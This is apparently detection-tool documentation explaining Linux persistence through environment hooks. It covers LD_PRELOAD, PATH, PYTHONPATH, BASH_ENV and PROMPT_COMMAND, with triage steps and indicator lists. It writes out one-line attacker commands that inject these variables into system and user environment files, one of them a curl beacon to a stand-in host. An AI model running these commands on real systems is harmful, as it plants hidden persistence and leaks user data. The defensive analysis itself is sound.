# Environment Hook Persistence

## Overview

Environment hooks are persistence-enabling mechanisms that influence how processes start, what libraries they load, what binaries they resolve, and what execution context they inherit.

Unlike cron or systemd, environment hooks usually do not create a visibly separate scheduled task or service. Instead, they alter the **conditions under which legitimate processes execute**. This makes them a subtle but extremely important persistence surface in Linux.

> **Environment hook persistence works by poisoning process context rather than scheduling obvious execution.**

In practical terms, attackers use environment hooks to shape what happens *before* or *during* program execution by modifying variables such as:

- `LD_PRELOAD`
- `LD_LIBRARY_PATH`
- `PATH`
- `PYTHONPATH`
- `BASH_ENV`
- `ENV`
- `PROMPT_COMMAND`

These variables can influence:
- library loading
- interpreter behavior
- shell initialization
- command resolution
- script execution flow

This category is especially important because it sits at the intersection of:

- persistence
- execution hijacking
- privilege abuse
- defense evasion

---

## Why Attackers Use Environment Hooks for Persistence

Attackers use environment hooks because they provide:

- Indirect execution through trusted programs
- Low-visibility persistence surfaces
- User-scoped or system-scoped control
- Easy integration with existing login and shell behavior
- Opportunities to influence multiple processes without creating obvious recurring tasks

Most analysts are trained to look for:
- cron jobs
- services
- startup scripts

Fewer analysts instinctively ask:

> Has the attacker changed the process environment so that legitimate execution now behaves maliciously?

That is why this surface matters.

---

## Execution Semantics

Environment hooks operate by modifying variables that are read by:

- shells
- dynamic loaders
- interpreters
- application runtimes
- login mechanisms
- PAM-related environment handling

Common system-level locations include:

- `/etc/environment`
- `/etc/environment.d/`
- `/etc/security/pam_env.conf`

Common user-level locations include:

- `~/.pam_environment`
- `~/.config/environment.d/`

### Core Concept

These files do not usually “run” like shell scripts. Instead, they define process environment values that later influence execution.

That distinction matters.

A cron entry says:

> Execute this command.

An environment hook says:

> When something else executes, do it under these attacker-controlled conditions.

---

## Why This Is Analytically Dangerous

Environment-based persistence is dangerous because it can be:

- quiet
- inherited
- distributed across multiple processes
- difficult to recognize as persistence

A malicious `PATH` or `LD_PRELOAD` definition may not look like “malware” to an inexperienced analyst. But if it causes trusted binaries to:

- resolve attacker-controlled executables
- load attacker-controlled libraries
- initialize attacker-controlled interpreter behavior

then it has become a persistence and execution-control mechanism.

---

## Privilege Requirements

### User-Level Persistence

Attackers with access to a user account may modify user-scoped environment hooks such as:

- `~/.pam_environment`
- `~/.config/environment.d/`

This allows them to influence that user’s future sessions and processes.

### System-Level Persistence

Attackers with root privileges may modify:

- `/etc/environment`
- `/etc/environment.d/`
- `/etc/security/pam_env.conf`

This is significantly more severe because it can affect many users or many services depending on the environment and authentication flow.

---

## Common Attacker Tradecraft

### 1. LD_PRELOAD Injection via Environment Hooks

Example:

```text
echo 'LD_PRELOAD=/tmp/libaudit.so' >> /etc/environment
```

Execution flow:
1. Attacker gains write access to system environment configuration  
2. Malicious shared object path is injected into `LD_PRELOAD`  
3. New login sessions inherit the modified environment  
4. Dynamically linked binaries load attacker-controlled code on execution  

Why attackers use this:
- Stealthy execution inside legitimate processes  
- No scheduler or service required  
- Can support credential theft, execution hijacking, or persistence  

---

### 2. PATH Hijacking for Command Execution Redirection

Example:

```text
echo 'PATH=/tmp/bin:$PATH' >> ~/.pam_environment
```

Execution flow:
1. Attacker creates malicious binaries in `/tmp/bin`  
2. User logs in and environment variables are applied  
3. Shell resolves commands using modified `PATH`  
4. Attacker-controlled binary executes instead of legitimate one  

Why attackers use this:
- Redirects execution without modifying scripts  
- Enables credential harvesting or command interception  
- Works reliably across interactive sessions  

---

### 3. PYTHONPATH Module Hijacking

Example:

```text
echo 'PYTHONPATH=/tmp/pyhooks' >> /etc/environment
```

Execution flow:
1. Attacker places malicious Python modules in `/tmp/pyhooks`  
2. Environment variable modifies Python import resolution  
3. Legitimate scripts import attacker-controlled modules  
4. Malicious code executes during normal script runtime  

Why attackers use this:
- Hijacks trusted automation workflows  
- Blends into legitimate interpreter behavior  
- Particularly effective in admin-heavy environments  

---

### 4. BASH_ENV / ENV Non-Interactive Shell Injection

Example:

```text
echo 'BASH_ENV=/tmp/.hookrc' >> /etc/environment
```

Execution flow:
1. Attacker defines environment hook for shell initialization  
2. Non-interactive shell executions reference `BASH_ENV`  
3. Shell sources attacker-controlled file  
4. Malicious logic executes during script execution  

Why attackers use this:
- Affects automation and backend scripts  
- Extends beyond interactive shell persistence  
- Often missed during standard triage  

---

### 5. PROMPT_COMMAND Execution Hook

Example:

```text
echo 'PROMPT_COMMAND="curl http://evil.test/beacon?u=$(whoami)"' >> ~/.pam_environment
```

Execution flow:
1. Attacker injects command into shell prompt behavior  
2. User opens interactive shell  
3. Command executes before each prompt display  
4. Attacker receives repeated execution or beaconing  

Why attackers use this:
- Repeated execution tied to user activity  
- Enables data exfiltration or session monitoring  
- Blends into normal shell customization  

---

### 6. LD_LIBRARY_PATH Dependency Hijacking

Example:

```text
echo 'LD_LIBRARY_PATH=/tmp/libs' >> /etc/environment
```

Execution flow:
1. Attacker places malicious shared objects in `/tmp/libs`  
2. Environment variable alters library search order  
3. Applications load attacker-controlled libraries  
4. Malicious code executes during application startup  

Why attackers use this:
- Alternative to `LD_PRELOAD` when restricted  
- Less obvious than direct preload injection  
- Enables stealthy runtime manipulation  

---

### 7. Combined Environment Hook Persistence (Layered Tradecraft)

Example:

```text
echo 'PATH=/tmp/bin:$PATH' >> ~/.pam_environment
echo 'LD_PRELOAD=/tmp/libhook.so' >> ~/.pam_environment
echo 'BASH_ENV=/tmp/.envrc' >> ~/.pam_environment
```

Execution flow:
1. Attacker establishes multiple environment-based hooks  
2. User logs in and inherits all modified variables  
3. Command resolution, library loading, and shell execution are all influenced  
4. Multiple persistence and execution paths are triggered  

Why attackers use this:
- Redundancy across multiple execution paths  
- Increased resilience against partial cleanup  
- Forces analysts to identify and remove all hooks  

---

### 8. System-Wide Environment Backdoor via `/etc/environment`

Example:

```text
echo 'PATH=/tmp/bin:$PATH' >> /etc/environment
```

Execution flow:
1. Attacker modifies system-wide environment configuration  
2. All future login sessions inherit modified `PATH`  
3. Multiple users may be affected  
4. Malicious binaries are executed system-wide  

Why attackers use this:
- Broad impact across users and sessions  
- High persistence value  
- Difficult to detect without baseline comparison  

---

## Key Tradecraft Insight

Environment hook persistence is rarely used in isolation.

It is often combined with:

- shell profile persistence (execution trigger)
- LD_PRELOAD persistence (execution hijack)
- SSH persistence (access maintenance)
- sudoers abuse (privilege escalation)
- cron/systemd (fallback execution)

> The environment variable is not the payload — it is the control mechanism that determines how and where the payload executes.

---

## What Normal Looks Like

Legitimate environment hooks commonly contain:

- locale settings
- proxy definitions
- standard `PATH` modifications
- compatibility variables
- application-specific runtime settings

Examples:

```text
PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
LANG=en_US.UTF-8
```

In healthy environments, legitimate values generally:

- reference standard system directories
- support known software
- align with host role
- avoid user-writable temporary directories

---

## What Malicious Use Looks Like

### High-Signal Indicators

- `LD_PRELOAD` set unexpectedly
- `LD_LIBRARY_PATH` pointing to:
  - `/tmp`
  - `/var/tmp`
  - `/dev/shm`
  - user-controlled directories
- `PATH` prepending attacker-writable locations
- `PYTHONPATH` referencing suspicious directories
- `BASH_ENV` or `ENV` pointing to attacker-controlled files
- `PROMPT_COMMAND` executing network or shell logic
- environment values containing:
  - `curl`
  - `wget`
  - `bash -c`
  - `sh -c`
  - `python -c`
  - `perl -e`

### Medium-Signal Indicators

- newly added files in `/etc/environment.d/`
- hidden user environment files
- environment values with unexplained local paths
- environment injection combined with shell profile changes

### Low-Signal Indicators

- developer tooling
- language runtime customization
- package-managed compatibility settings
- internal proxy or locale configuration

---

## ATT&CK Mapping

Environment hooks do not always fit neatly into one ATT&CK sub-technique, which is exactly why analysts need to understand them conceptually rather than just memorizing file paths.

The most relevant ATT&CK relationships are:

- **T1574 – Hijack Execution Flow**
- **T1574.006 – Dynamic Linker Hijacking** (when `LD_PRELOAD` or related loader abuse is involved)
- **T1546 – Event Triggered Execution** (when environment manipulation causes execution during login, shell, or session events)

This category often overlaps persistence, defense evasion, and privilege escalation depending on how the variables are used.

---

## Why Analysts Miss This Technique

Analysts miss environment-hook persistence for several recurring reasons:

### 1. The Files Look Administrative

Files like `/etc/environment` appear operational, not adversarial.

### 2. Variables Do Not Look Like “Execution”

A line like:

```text
PATH=/tmp/bin:$PATH
```

does not look like malware until the analyst understands command resolution.

### 3. The Trigger Is Indirect

The file itself may never launch a process. It only changes how later processes behave.

### 4. The Abuse Is Context-Dependent

A variable may be benign on one host and highly suspicious on another depending on:
- system role
- user role
- directory ownership
- application stack

---

## Deep Analytical Guidance

### Key Question

> Does this environment definition cause legitimate programs to execute under attacker-controlled conditions?

That is the right question.

The wrong question is:

> Does this line look obviously malicious?

Many malicious environment hooks are subtle. Their power lies in **behavioral consequence**, not cosmetic appearance.

---

### Focus Areas

#### 1. Variable Type

What kind of influence does the variable provide?

- library loading
- shell sourcing
- command resolution
- interpreter module resolution
- session-triggered command execution

#### 2. Path Trustworthiness

Where does the variable point?

Ask:
- Is the path package-managed?
- Is it writable by users?
- Is it ephemeral or temporary?
- Should a trusted process ever rely on it?

#### 3. Scope

Does the hook affect:
- one user
- all users
- one application
- all login sessions
- all dynamic binaries in scope

#### 4. Inheritance

Which processes inherit the modified environment?

This matters because a small-looking config change can produce large operational consequences if inherited broadly.

#### 5. Chaining

Is this environment hook supporting another mechanism?

Examples:
- `LD_PRELOAD` supporting execution hijack
- `PATH` supporting command replacement
- `BASH_ENV` supporting non-interactive shell persistence

---

## Procedure Examples (Tradecraft)

### Example 1: Library Injection Through Environment File

```text
echo 'LD_PRELOAD=/tmp/libaudit.so' >> /etc/environment
```

Execution flow:
1. Attacker gains privileged write access
2. Environment file is modified
3. Future sessions inherit malicious preload setting
4. Compatible dynamically linked processes load attacker-controlled code

---

### Example 2: Path Hijack for Administrative Command Interception

```text
echo 'PATH=/tmp/bin:$PATH' >> ~/.pam_environment
```

Execution flow:
1. Attacker creates malicious binaries in `/tmp/bin`
2. User logs in
3. Session inherits modified `PATH`
4. User executes a normal command
5. Malicious replacement runs first

---

### Example 3: Non-Interactive Shell Hijack

```text
echo 'BASH_ENV=/tmp/.hookrc' >> /etc/environment
```

Execution flow:
1. Attacker defines shell environment hook
2. Future shell-based scripts source attacker-controlled file
3. Malicious logic executes implicitly

This is especially important on systems where shell wrappers or admin scripts are common.

---

## Triage Workflow

1. Inspect system-level environment definitions:

```text
cat /etc/environment
ls /etc/environment.d/
cat /etc/security/pam_env.conf
```

2. Inspect user-level environment definitions:

```text
cat ~/.pam_environment
ls ~/.config/environment.d/
```

3. Look for high-risk variables:
- `LD_PRELOAD`
- `LD_LIBRARY_PATH`
- `PATH`
- `PYTHONPATH`
- `BASH_ENV`
- `ENV`
- `PROMPT_COMMAND`

4. Validate referenced paths

5. Check file metadata:

```text
stat /etc/environment
stat /etc/environment.d/*
stat ~/.pam_environment
```

6. Correlate with:
- user activity
- shell profile changes
- suspicious `.so` files
- command hijack artifacts
- process anomalies

---

## Evidence to Preserve

- `/etc/environment`
- `/etc/environment.d/*`
- `/etc/security/pam_env.conf`
- `~/.pam_environment`
- `~/.config/environment.d/*`
- referenced files and directories
- file metadata (timestamps, ownership, permissions)
- suspicious binaries or libraries referenced by variables
- login/session telemetry if available

---

## False Positive Reduction

Environment customization is common, so analysts must distinguish malicious influence from ordinary runtime configuration.

Reduce false positives by asking:

- Does this host role justify this variable?
- Is the path standard and trusted?
- Is the referenced file package-managed?
- Is the change recent?
- Does the variable create execution, interception, or loading behavior?

A modified `PATH` is not automatically malicious.  
A modified `PATH` that prepends `/tmp/bin` on an admin server is a very different matter.

---

## Why Tenax Checks This Surface

Tenax checks environment hooks because they represent one of the easiest ways for attackers to:

- hijack execution flow
- extend user-scoped persistence
- support loader-based persistence
- redirect trusted command resolution
- hide inside legitimate runtime behavior

This surface is often missed precisely because it does not look like classic persistence.

> Environment hooks do not announce execution. They redefine it.

---

## Key Takeaway

Environment-hook persistence is about controlling the conditions under which trusted execution occurs.

The attacker does not need a visible task or service.

> They only need to ensure that when something legitimate runs, it runs on their terms.
